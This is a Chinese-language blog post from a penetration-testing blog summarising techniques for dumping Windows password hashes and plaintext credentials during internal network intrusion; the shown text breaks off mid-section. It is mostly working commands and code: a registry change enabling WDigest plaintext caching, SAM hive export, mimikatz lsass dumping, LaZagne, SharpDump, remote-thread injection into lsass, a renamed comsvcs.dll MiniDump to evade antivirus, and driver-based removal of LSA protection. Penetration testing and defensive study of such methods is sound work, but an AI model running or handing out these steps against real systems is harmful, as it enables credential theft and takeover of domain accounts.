---
title: 内网渗透导出HASH总结 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18616393
source: 博客园 - 渗透测试中心
date: 2024-12-20
fetch_date: 2025-10-06T19:38:14.342438
---

# 内网渗透导出HASH总结 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [内网渗透导出HASH总结](https://www.cnblogs.com/backlion/p/18616393 "发布于 2024-12-19 09:26")

### 获取当前机器的明文密码

在导出域hash之前，我们可以先尝试导出当前机器的本地的hash密码，如果域用户之前在这台机器上进行登陆操作的话，可以直接获取到域用户甚至域管理员的账号。

在Windows操作系统上，sam数据库（C:\Windows\System32\config\sam）里保存着本地用户的hash。

在本地认证的流程中，作为本地安全权限服务进程lsass.exe也会把用户密码缓存在内存中（dmp文件）。

因此，在这里我们可以考虑两种方式进行抓取当前机器的hash：在线工具提取，离线分析提取。

注意：在windows 10\ 2012r2之后的系统版本中，默认情况下已禁用在内存缓存中存系统用户明文密码，此时再直接使用mimikatz去抓明文，肯定是抓不到的。密码字段位会直接显示为null。

这里我们手动修改注册表让其保存明文，方便我们进行抓取。（修改后需要注销用户再登陆）

`reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG\_DWORD /d 1 /f`

#### mimikatz

mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。

下载地址：<https://github.com/gentilkiwi/mimikatz>

1.通过注册表抓取hash

命令行执行，获取当前系统注册表的SAM、SYSTEM文件（需要本地的管理员权限）

`reg save HKLM\\SYSTEM Sys.hiv`

`reg save HKLM\\SAM Sam.hiv`

获取到文件后可以下载到攻击者本机，离线使用mimikatz分析提取hash。

`mimikatz.exe "lsadump::sam /sam:Sam.hiv /system:Sys.hiv" "exit"`

这个方法只能获取到保存在SAM文件中的本地用户的账户

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092533594-1340211630.png)

2.上传mimikatz进入目标靶机，在线提取本地SAM文件保存的账户hash值

`privilege::debug`

`token::elevate`

`lsadump::sam`

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092534227-563959200.png)

3.从lsass.exe的内存中提权hash

`mimikatz "privilege::debug" "sekurlsa::logonpasswords full" "exit"`

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092534689-2025701400.png)

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092535426-1337736563.png)

发现使用本地用户的管理员权限抓取到了登陆过本机的域管理员的hash值。

#### pwdump7

直接运行PwDump7.exe即可

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092535903-1549077104.png)

#### WEC

上传到目标靶机添加参数直接运行即可。

-l 列出登录的会话和NTLM凭据（默认值）
-s 修改当前登录会话的NTLM凭据 参数：<用户名>:<域名>:<LM哈希>:<NT哈希>
-r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次
-c 用一个特殊的NTML凭据运行一个新的会话 参数：
-e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次
-o 保存所有的输出到一个文件 参数:<文件名>
-i 指定一个LUID代替使用当前登录会话 参数:
-d 从登录会话中删除NTLM凭据 参数:
-a 使用地址 参数: <地址>
-f 强制使用安全模式
-g 生成LM和NT的哈希 参数<密码>
-K 缓存kerberos票据到一个文件（unix和windows wce格式）
-k 从一个文件中读取kerberos票据并插入到windows缓存中
-w 通过摘要式认证缓存一个明文的密码
-v 详细输出

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092536445-202247192.png)

#### laZagne

下载地址：<https://github.com/AlessandroZ/LaZagne>

`LaZagne.exe all`

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092537027-1800853870.png)

#### SharpDump

<https://github.com/GhostPack/SharpDump>

直接编译即可

`./Sharpdump`

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092537619-2059041528.png)

#### LsassSilentProcessExit

<https://mp.weixin.qq.com/s/8uEr5dNaQs24KuKxu5Yi9w>

Silent Process Exit，即静默退出。而这种调试技术，可以派生 werfault.exe进程，可以用来运行任意程序或者也可以用来转存任意进程的内存文件或弹出窗口。

主要使用LsassSilentProcessExit这个api，通过修改注册表+远程进程注入的方式转储内存,相关的注册表键值：

`#define IFEO\_REG\_KEY "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\"`

`#define SILENT\_PROCESS\_EXIT\_REG\_KEY "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\"`

使用远程进程注入让lsass.exe自己调用RtlReportSilentProcessExit函数：

`HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");`

`RtlReportSilentProcessExit\_func RtlReportSilentProcessExit = (RtlReportSilentProcessExit\_func)GetProcAddress(hNtdll, "RtlReportSilentProcessExit");`

`HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD\_START\_ROUTINE)RtlReportSilentProcessExit, (LPVOID)-1, NULL, NULL);`

但是由于需要修改注册表，因此几乎无法绕过杀软环境。

`LsassSilentProcessExit.exe 616 0`

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092538300-731027178.png)

#### 在敏感的环境下转储lsass进程的方式

##### 无文件上传使用powershell导出

<https://blog.csdn.net/chenfeng857/article/details/120126818>

<https://xz.aliyun.com/t/12157#toc-9>

comsvcs.dll，系统自带。通过comsvcs.dll的导出函数MiniDump实现dump内存。

在dump指定进程内存文件时，需要开启SeDebugPrivilege权限。管理员权限的cmd下，默认支持SeDebugPrivilege权限，但是状态为Disabled禁用状态

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092539069-424700168.png)

如果直接在cmd下执行rundll32的命令尝试dump指定进程内存文件的话，由于无法开启SeDebugPrivilege权限，会dump失败。

但是，在管理员权限的powershell下，默认支持SeDebugPrivilege权限，并且状态为已启用。

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092539763-1268432380.png)

首先查看lsass.exe进程PID

`tasklist | findstr lsass.exe`

`rundll32.exe comsvcs.dll MiniDump PID Path full`

`rundll32.exe comsvcs.dll MiniDump 1096 C:\\Users\\16229\\Desktop\\1.dmp full`

直接运行的话有可能会被杀软拦截。

一个简单的绕过思路：

copycomsvcs.dll到不敏感的目录，并随机命名，例如test.dll

`copy C:\\windows\\System32\\comsvcs.dll test.dll`

`rundll32.exe C:\\Users\\16229\\Desktop\\code\_java\\test.dll MiniDump 1096 C:\\Users\\16229\\Desktop\\code\_java\\3.dmp full`

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092540340-1570021611.png)

拖到本地使用mimikatz进行分析即可。

`mimikatz.exe log "sekurlsa::minidump 2.dmp" "sekurlsa::logonPasswords full" exit`

##### 在开启runasppl的环境下

<https://www.freebuf.com/articles/system/332506.html>

<https://xz.aliyun.com/t/12157#toc-19>

###### mimikatz

在开启PPL保护的情况下，即使是管理员也无法打开lsass进程。

`mimikatz "privilege::debug" "sekurlsa::logonpasswords full" "exit"`

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092540954-1048096232.png)

Mimikatzprivilege::debug中的命令成功启用；SeDebugPrivilege，但是该命令sekurlsa::logonpasswords失败并出现错误代码0x00000005，从minikatz代码kuhl\_m\_sekurlsa\_acquireLSA()函数中我们可以简单了解为

```
HANDLE hData = NULL;
DWORD pid;
DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
kull_m_process_getProcessIdForName(L"lsass.exe", &pid);
hData = OpenProcess(processRights, FALSE, pid);
if (hData && hData != INVALID_HANDLE_VALUE) {
// if OpenProcess OK
}
else {
PRINT_ERROR_AUTO(L"Handle on memory");
}
```

使用process explorer打开lsass进程查看，显示拒绝访问。

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092541565-791661959.png)

在Mimikatz中使用数字签名的驱动程序来删除内核中 Process 对象的保护标志

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219092542211-1122288396.png)

minikatz安装驱动程序

privilege::debug

!+

![](https://img2023.cnblogs.com/blog/1049983/2024...